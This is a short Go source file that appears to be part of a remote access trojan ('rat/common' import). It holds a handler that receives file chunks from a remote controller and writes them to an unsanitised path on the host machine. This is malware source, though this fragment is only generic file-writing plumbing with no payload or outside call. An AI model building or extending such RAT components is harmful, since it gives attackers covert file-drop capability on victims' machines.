package main

import (
	"os"
	"rat/common"
)

type DownloadPacket struct {
	File  string `receive`
	Final bool   `receive`
	Part  []byte `receive`
}

type TransfersMap map[string]*os.File

var Transfers TransfersMap

func init() {
	Transfers = make(TransfersMap)
}

func (packet DownloadPacket) Header() common.PacketHeader {
	return common.PutFileHeader
}

func (packet DownloadPacket) OnReceive() error {
	file := packet.File

	var err error

	if _, ok := Transfers[file]; !ok {
		Transfers[file], err = os.Create(file)
		if err != nil {
			return err
		}
	}

	w := Transfers[file]
	_, err = w.Write(packet.Part)

	if err != nil {
		return err
	}

	if packet.Final {
		err = w.Sync()
		if err != nil {
			return err
		}
		err = w.Close()
		if err != nil {
			return err
		}

		delete(Transfers, file)

		return nil
	}

	return err
}
